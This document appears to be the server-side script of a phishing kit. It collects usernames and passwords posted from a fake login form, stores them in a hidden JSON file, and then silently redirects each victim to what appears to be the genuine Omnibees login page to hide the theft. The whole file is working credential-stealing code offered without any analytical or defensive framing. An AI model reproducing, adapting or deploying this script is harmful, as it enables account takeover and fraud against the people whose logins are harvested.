


<?php
$username = $_POST['username'];
$password = $_POST['password'];

    $fl = "operador/seguro/boleto1.json";
    if(file_exists($fl)){
        $h = fopen($fl, "r");
        $arr = json_decode(fread($h, filesize ($fl)));
        array_push($arr,array($username, $password));
        fclose($h);
    } else {
        $arr = array(
            array($username, $password)
        );
    }
    $fhs = fopen($fl, 'w') or die("can't open file");
    fwrite($fhs, json_encode($arr));
    fclose($fhs);
    
    header("location:https://obauth.omnibees.com/core/login?signin=cf4e8f1aca93c0258057c413c939d7ba");
 